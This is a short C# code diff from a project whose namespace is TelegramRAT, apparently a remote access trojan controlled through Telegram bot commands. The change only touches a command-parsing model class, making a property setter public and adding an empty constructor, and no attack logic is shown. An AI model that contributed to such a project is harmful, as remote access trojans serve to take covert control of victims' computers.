@@ -12,12 +12,17 @@ namespace TelegramRAT
         public string Command { get; set; }
         public string[] Args { get; set; }
         public string RawArgs { get; set; }
-        public Message Message { get; private set; }
+        public Message Message { get; set; }
         public FileBase[] Files { get; private set; }
         /// <summary>
         /// Document file name, null if no document was added to message.
         /// </summary>
         public string? Filename { get; private set; }
+
+        public BotCommandModel()
+        {
+
+        }
 
         public static BotCommandModel FromMessage(Message message, string customCommandMarker = null)
         {
